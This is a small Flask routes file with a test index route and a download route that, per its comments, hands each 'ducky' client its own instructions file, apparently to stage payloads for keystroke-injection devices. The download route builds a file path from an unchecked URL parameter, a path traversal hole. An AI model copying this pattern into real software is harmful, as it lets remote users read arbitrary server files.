import os
from app import app


#Basic route. Used to test if server is running and responding to requests
@app.route('/')
@app.route('/index')
def index():
    return "Hello, World!"

# <duckey_name> corresponds to the name each ducky client has. This allows you 
# to have different instructions to 
# different duckys. 
@app.route('/download/<duckey_name>', methods = ['GET'])
def filePage(duckey_name):
    path = os.getcwd() +"/files/" + duckey_name
    print(path)
    with open(path, "r") as file:
        data = file.read()
        return (data, 200)
